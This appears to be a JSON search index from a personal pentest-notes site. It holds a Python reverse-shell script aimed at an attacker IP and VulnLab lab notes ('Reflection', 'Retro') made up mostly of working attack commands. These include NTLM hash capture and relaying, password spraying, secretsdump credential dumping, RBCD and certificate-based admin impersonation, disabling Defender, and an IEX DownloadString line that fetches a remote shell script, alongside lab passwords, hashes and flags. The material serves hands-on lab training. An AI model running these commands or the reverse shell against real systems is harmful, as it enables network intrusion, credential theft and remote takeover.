class=\"nx\"\u003einput\u003c/span\u003e \u003cspan class=\"nx\"\u003eid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;shell-cmd\u0026#34;\u003c/span\u003e \u003cspan class=\"nx\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;cmd\u0026#34;\u003c/span\u003e \u003cspan class=\"nx\"\u003eonkeydown\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;_onShellCmdKeyDown(event)\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nx\"\u003ediv\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nx\"\u003ediv\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nx\"\u003ediv\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nx\"\u003ehtml\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"PownyShell"},{"content":"\rimport pty import socket import os # Define the remote host and port to connect to HOST = \u0026#39;10.8.3.12\u0026#39; # Replace with the attacker\u0026#39;s IP address PORT = 4242 # Replace with the desired port number # Create and connect the socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((HOST, PORT)) # Redirect standard file descriptors to the socket os.dup2(s.fileno(), 0) # Redirect stdin os.dup2(s.fileno(), 1) # Redirect stdout os.dup2(s.fileno(), 2) # Redirect stderr # Spawn a new bash shell pty.spawn(\u0026#39;/bin/bash\u0026#39;)\r","date":"2023-09-07","id":92,"permalink":"/notes/shell-and-payload/python/","summary":"\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport pty\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport socket\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport os\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Define the remote host and port to connect to\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eHOST\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;10.8.3.12\u0026#39;\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# Replace with the attacker\u0026#39;s IP address\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ePORT\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e4242\u003c/span\u003e        \u003cspan class=\"c1\"\u003e# Replace with the desired port number\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Create and connect the socket\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e socket.socket\u003cspan class=\"o\"\u003e(\u003c/span\u003esocket.AF_INET, socket.SOCK_STREAM\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003es.connect\u003cspan class=\"o\"\u003e((\u003c/span\u003eHOST, PORT\u003cspan class=\"o\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Redirect standard file descriptors to the socket\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eos.dup2\u003cspan class=\"o\"\u003e(\u003c/span\u003es.fileno\u003cspan class=\"o\"\u003e()\u003c/span\u003e, 0\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# Redirect stdin\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eos.dup2\u003cspan class=\"o\"\u003e(\u003c/span\u003es.fileno\u003cspan class=\"o\"\u003e()\u003c/span\u003e, 1\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# Redirect stdout\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eos.dup2\u003cspan class=\"o\"\u003e(\u003c/span\u003es.fileno\u003cspan class=\"o\"\u003e()\u003c/span\u003e, 2\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# Redirect stderr\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Spawn a new bash shell\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epty.spawn\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;/bin/bash\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"Python"},{"content":"Scan\nPORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-27 13:55:52Z) 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -1s | smb2-time: | date: 2024-08-27T13:55:56 |_ start_date: N/A | smb2-security-mode: | 311: |_ Message signing enabled but not required\rMS01\nPORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 3389/tcp open ms-wbt-server Microsoft Terminal Services |_ssl-date: 2024-08-27T13:57:42+00:00; -2s from scanner time. | ssl-cert: Subject: commonName=ms01.reflection.vl | Not valid before: 2024-08-26T13:54:12 |_Not valid after: 2025-02-25T13:54:12 | rdp-ntlm-info: | Target_Name: REFLECTION | NetBIOS_Domain_Name: REFLECTION | NetBIOS_Computer_Name: MS01 | DNS_Domain_Name: reflection.vl | DNS_Computer_Name: ms01.reflection.vl | DNS_Tree_Name: reflection.vl | Product_Version: 10.0.20348 |_ System_Time: 2024-08-27T13:57:36+00:00 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 1433/tcp open ms-sql-s 3389/tcp open ms-wbt-server 5985/tcp open wsman 49668/tcp open unknown 49675/tcp open unknown\rWS01\nPORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services |_ssl-date: 2024-08-27T13:59:06+00:00; -1s from scanner time. | ssl-cert: Subject: commonName=ws01.reflection.vl | Not valid before: 2024-08-26T13:56:51 |_Not valid after: 2025-02-25T13:56:51 | rdp-ntlm-info: | Target_Name: REFLECTION | NetBIOS_Domain_Name: REFLECTION | NetBIOS_Computer_Name: WS01 | DNS_Domain_Name: reflection.vl | DNS_Computer_Name: ws01.reflection.vl | DNS_Tree_Name: reflection.vl | Product_Version: 10.0.19041 |_ System_Time: 2024-08-27T13:58:26+00:00 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -1s, deviation: 0s, median: -1s | smb2-time: | date: 2024-08-27T13:58:29 |_ start_date: N/A | smb2-security-mode: | 311:\rEnum :\nnetexec smb $t2 -u \u0026#34;Guest\u0026#34; -p \u0026#34;\u0026#34; --shares smbclient \\\\\\\\$t2\\\\staging -U reflection.vl/Guest\rCreds :\nuser=web_staging password=Washroom510 db=staging#\rSql :\nmssqlclient.py reflection/web_staging:Washroom510@$t2\rNew creds :\nid username password -- -------- ------------- 1 b\u0026#39;dev01\u0026#39; b\u0026#39;Initial123\u0026#39; 2 b\u0026#39;dev02\u0026#39; b\u0026#39;Initial123\u0026#39;\rCatch hash :\nEXEC master.sys.xp_dirtree \u0026#39;\\\\10.8.3.12\\myshare\u0026#39;,1,1 responder --interface \u0026#34;tun0\u0026#34; -wd\rhash:\n[SMB] NTLMv2-SSP Client : 10.10.231.70 [SMB] NTLMv2-SSP Username : REFLECTION\\svc_web_staging [SMB] NTLMv2-SSP Hash : svc_web_staging::REFLECTION:1122334455667788:E571FE0EBECB9CB8DB559D27EBE656EB:0101000000000000003D84A55EF9DA019EA269D8030FBA090000000002000800430053003900500001001E00570049004E002D0048004D0031004A004A00430044004B00530030004A0004003400570049004E002D0048004D0031004A004A00430044004B00530030004A002E0043005300390050002E004C004F00430041004C000300140043005300390050002E004C004F00430041004C000500140043005300390050002E004C004F00430041004C0007000800003D84A55EF9DA010600040002000000080030003000000000000000000000000030000027C118CC925121058025F73FFB610BAD0E485878B21AE520900B1841F0D366EC0A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0038002E0033002E00310032000000000000000000\rntlmrelayx.py -tf host -smb2support -socks proxychains smbclient.py //10.10.231.71 -U REFLECTION/SVC_WEB_STAGING proxychains smbclient.py \u0026#39;reflection\u0026#39;/SVC_WEB_STAGING@10.10.211.230 #or ntlmrelayx.py -tf host -smb2support -i nc 127.0.0.1 11000\rNew creds :\nuser=web_prod password=Tribesman201 db=prod\rproxychains -q nxc smb 10.10.231.69 -u SVC_WEB_STAGING -d REFLECTION -p \u0026#34;\u0026#34; --rid-brute | grep \u0026#39;\\\\\u0026#39; | cut -d $\u0026#39;\\\\\u0026#39; -f2 | cut -d \u0026#39; \u0026#39; -f1 | tee -a users_rid.txt netexec smb 10.10.231.69 10.10.231.71 10.10.231.70 -u users_rid.txt -p \u0026#34;Tribesman201\u0026#34; --no-bruteforce --continue-on-success mssqlclient.py reflection/web_prod:Tribesman201@$t1 EXEC master.sys.xp_dirtree \u0026#39;\\\\10.8.3.12\\myshare\u0026#39;,1,1 1 b\u0026#39;abbie.smith\u0026#39; b\u0026#39;CMe1x+nlRaaWEw\u0026#39; 2 b\u0026#39;dorothy.rose\u0026#39; b\u0026#39;hC_fny3OK9glSJ\u0026#39;\rNew hash : svc_web_prod::REFLECTION:1122334455667788:295501EFF7AD61355C78FF22D9829E72:010100000000000000608A0DFFF9DA01CB89B8936F2120F300000000020008004A005A004B00550001001E00570049004E002D0047005400590056004400530045004F0043004A00360004003400570049004E002D0047005400590056004400530045004F0043004A0036002E004A005A004B0055002E004C004F00430041004C00030014004A005A004B0055002E004C004F00430041004C00050014004A005A004B0055002E004C004F00430041004C000700080000608A0DFFF9DA0106000400020000000800300030000000000000000000000000300000B0270D3322128C9BC7D2F3E0AA6C18EC8D3C58D513D3B9C3B59E6B274E4D01DF0A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0038002E0033002E00310032000000000000000000\rEnum : bloodhound-python -d \u0026#39;reflection.vl\u0026#39; -u \u0026#39;dorothy.rose\u0026#39; -p \u0026#39;hC_fny3OK9glSJ\u0026#39; -ns 10.10.211.230 -dc reflection.vl -c all\rFoothold : netexec smb 10.10.211.230 -u abbie.smith -p \u0026#34;CMe1x+nlRaaWEw\u0026#34; --laps evil-winrm -i 10.10.212.150 -u \u0026#34;Administrator\u0026#34; -p \u0026#34;H447.++h6g5}xi\u0026#34;\rMachine 1 VL{0d0a7b68ddc98dba0a3eb5e9b8a409ff}\nDumping creds :\nnetexec smb 10.10.212.150 -u \u0026#34;Administrator\u0026#34; -p \u0026#34;H447.++h6g5}xi\u0026#34; --dpapi --local-auth secretsdump \u0026#39;ms01/administrator:H447.++h6g5}xi@10.10.234.54\u0026#39; REFLECTION\\Georgia.Price:DBl+5MPkpJg5id\rRBCD :\n# Read the attribute rbcd.py -delegate-to \u0026#39;ws01$\u0026#39; -dc-ip \u0026#39;dc$\u0026#39; -action \u0026#39;read\u0026#39; \u0026#39;reflection.vl\u0026#39;/\u0026#39;Georgia.Price\u0026#39;:\u0026#39;DBl+5MPkpJg5id\u0026#39; # Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity rbcd.py -delegate-from \u0026#39;ms01$\u0026#39; -delegate-to \u0026#39;ws01$\u0026#39; -dc-ip \u0026#39;$dc\u0026#39; -action \u0026#39;write\u0026#39; \u0026#39;reflection.vl\u0026#39;/\u0026#39;Georgia.Price\u0026#39;:\u0026#39;DBl+5MPkpJg5id\u0026#39; getST.py -spn \u0026#39;cifs/ws01.reflection.vl\u0026#39; -impersonate Administrator -dc-ip \u0026#39;$DC\u0026#39; \u0026#39;REFLECTION.VL/MS01$\u0026#39; -hashes :c1658a71853a7f23f7ff13cd1c7ee10a export KRB5CCNAME=Administrator.ccache nxc smb 10.10.202.39 --use-kcache --lsa --sam --dpapi\rFoothold : atexec.py -hashes \u0026#39;:a29542cb2707bf6d6c1d2c9311b0ff02\u0026#39; \u0026#39;ws01\u0026#39;/\u0026#39;Administrator\u0026#39;@\u0026#39;10.10.202.39\u0026#39; whoami nxc smb 10.10.202.39 --use-kcache -x \u0026#34;powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true\u0026#34; nxc smb 10.10.202.39 --use-kcache -x \u0026#34;powershell.exe IEX(New-Object System.Net.WebClient).DownloadString(\u0026#39;http://10.8.3.12:8080/shell.ps1\u0026#39;)\u0026#34; password: knh1gJ8Xmeq+uP #password spraying\rNew creds : Rhys.Garner : knh1gJ8Xmeq+uP nxc ldap 10.10.202.37 -u Rhys.Garner -p knh1gJ8Xmeq+uP --bloodhound --collection All -ns 10.10.202.37\rPassword spraying : Admin --\u0026gt; dom_rgarner : knh1gJ8Xmeq+uP\rRoot : VL{050ec757b24206dec5731c0f7c183d17}\n","date":"2023-09-07","id":93,"permalink":"/notes/lab/vulnlab/reflection/","summary":"\u003cp\u003eScan\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE       VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp   open  domain        Simple DNS Plus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e88/tcp   open  kerberos-sec  Microsoft Windows Kerberos \u003cspan class=\"o\"\u003e(\u003c/span\u003eserver time: 2024-08-27 13:55:52Z\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e135/tcp  open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp  open  microsoft-ds?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp  open  kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3268/tcp open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: reflection.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp open  tcpwrapped\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: Host: DC01\u003cspan class=\"p\"\u003e;\u003c/span\u003e OS: Windows\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost script results:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_clock-skew: -1s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-time:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   date: 2024-08-27T13:55:56\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  start_date: N/A\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-security-mode:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   311:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_    Message signing enabled but not required\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eMS01\u003c/p\u003e","tags":[],"title":"Reflection"},{"content":"Scan :\nHost is up (0.019s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-29 11:32:31Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=DC.retro.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.retro.vl | Not valid before: 2024-07-29T11:17:32 |_Not valid after: 2025-07-29T11:17:32 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC.retro.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.retro.vl | Not valid before: 2024-07-29T11:17:32 |_Not valid after: 2025-07-29T11:17:32 |_ssl-date: TLS randomness does not represent time 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=DC.retro.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.retro.vl | Not valid before: 2024-07-29T11:17:32 |_Not valid after: 2025-07-29T11:17:32 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=DC.retro.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.retro.vl | Not valid before: 2024-07-29T11:17:32 |_Not valid after: 2025-07-29T11:17:32 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=DC.retro.vl | Not valid before: 2024-07-28T11:26:17 |_Not valid after: 2025-01-27T11:26:17 |_ssl-date: 2024-07-29T11:33:50+00:00; -1s from scanner time. | rdp-ntlm-info: | Target_Name: RETRO | NetBIOS_Domain_Name: RETRO | NetBIOS_Computer_Name: DC | DNS_Domain_Name: retro.vl | DNS_Computer_Name: DC.retro.vl | Product_Version: 10.0.20348 |_ System_Time: 2024-07-29T11:33:10+00:00 Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -1s, deviation: 0s, median: -2s | smb2-time: | date: 2024-07-29T11:33:13 |_ start_date: N/A | smb2-security-mode: | 311: |_ Message signing enabled and required\rKerbrute : [Jul 29, 2024 - 14:13:16 (CEST)] exegol-Algo /workspace # kerbrute userenum --dc $t -d retro.vl /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: dev (n/a) - 07/29/24 - Ronnie Flathers @ropnop 2024/07/29 14:14:41 \u0026gt; Using KDC(s): 2024/07/29 14:14:41 \u0026gt; 10.10.65.99:88 2024/07/29 14:14:42 \u0026gt; [+] VALID USERNAME: guest@retro.vl 2024/07/29 14:14:45 \u0026gt; [+] VALID USERNAME: administrator@retro.vl 2024/07/29 14:15:25 \u0026gt; [+] VALID USERNAME: Guest@retro.vl 2024/07/29 14:15:25 \u0026gt; [+] VALID USERNAME: Administrator@retro.vl 2024/07/29 14:15:43 \u0026gt; [+] VALID USERNAME: tblack@retro.vl 2024/07/29 14:16:02 \u0026gt; [+] VALID USERNAME: banking@retro.vl 2024/07/29 14:17:06 \u0026gt; [+] VALID USERNAME: trainee@retro.vl 2024/07/29 14:17:40 \u0026gt; [+] VALID USERNAME: GUEST@retro.vl 2024/07/29 14:25:01 \u0026gt; [+] VALID USERNAME: Banking@retro.vl 2024/07/29 14:32:54 \u0026gt; [+] VALID USERNAME: jburley@retro.vl\rPassword spraying : netexec smb 10.10.65.99 -u usert.txt -p usert.txt --no-bruteforce --continue-on-success\rEnumerate share : netexec smb 10.10.65.99 -u \u0026#34;trainee\u0026#34; -p \u0026#34;trainee\u0026#34; --group\rTodolist : Thomas, after convincing the finance department to get rid of their ancienct banking software it is finally time to clean up the mess they made. We should start with the pre created computer account. That one is older than me. Best James#\rBloodhound : bloodhound-python -d \u0026#39;retro.VL\u0026#39; -u \u0026#39;trainee\u0026#39; -p \u0026#39;trainee\u0026#39; -ns 10.10.65.99 -dc dc.retro.vl -c all\rpre2k auth -u banking -p banking -d retro.vl -dc-ip 10.10.65.99 -verbose\rchangepasswd.py retro.vl/banking\\$@10.10.65.99 -newpass \u0026#39;TestPass!2\u0026#39; -p rpc-samr\r// Not working but good to try ;)\ngetTGT.py -dc-ip \u0026#34;10.10.65.99\u0026#34; \u0026#34;retro.vl\u0026#34;/\u0026#39;banking\u0026#39;:\u0026#39;TestPass!2\u0026#39;\rexport KRB5CCNAME=/workspace/banking.ccache\rGetNPUsers.py -debug -dc-ip 10.10.65.99 retro.vl/\u0026#39;banking\u0026#39; -k -no-pass -request\r//\nEnumeration certificate with certipy : certipy find -u \u0026#39;banking$\u0026#39;@retro.vl -p \u0026#39;TestPass!2\u0026#39; -dc-ip 10.10.65.99\r'banking$' Notation for machine account , service same for bloodhound .\nFind vulnerable certificate templates :\ncertipy find -u \u0026#39;banking$\u0026#39;@retro.vl -p \u0026#39;TestPass!2\u0026#39; -dc-ip 10.10.65.99\rImpersonate an admin :\ncertipy req -username \u0026#39;banking$\u0026#39;@retro.vl -password \u0026#39;TestPass!2\u0026#39; -target-ip \u0026#39;dc.retro.vl\u0026#39; -ca \u0026#39;retro-DC-CA\u0026#39; -template \u0026#39;RetroClients\u0026#39; -upn \u0026#39;administrator@retro.vl\u0026#39; -debug -key-size 4096\rThen you can transform the generated certificate to **.pfx** format and use it to authenticate using certipy again:\ncertipy auth -pfx \u0026#39;administrator.pfx\u0026#39; -username \u0026#39;administrator\u0026#39; -domain \u0026#39;retro.vl\u0026#39; -dc-ip 10.10.65.99\rResult : [*] Using principal: administrator@retro.vl [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to \u0026#39;administrator.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;administrator\u0026#39; [*] Got hash for \u0026#39;administrator@retro.vl\u0026#39;: aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389\rFoothold : evil-winrm -i 10.10.65.99 -u Administrator -H \u0026#39;252fac7066d93dd009d4fd2cd0368389\u0026#39;\rRoot VL{8b13de0d077813ff16c5e792186bdde4}\n","date":"2023-09-07","id":94,"permalink":"/notes/lab/vulnlab/retro/","summary":"\u003cp\u003eScan :\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost is up \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.019s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNot shown: \u003cspan class=\"m\"\u003e988\u003c/span\u003e filtered tcp ports \u003cspan class=\"o\"\u003e(\u003c/span\u003eno-response\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE       VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp   open  domain        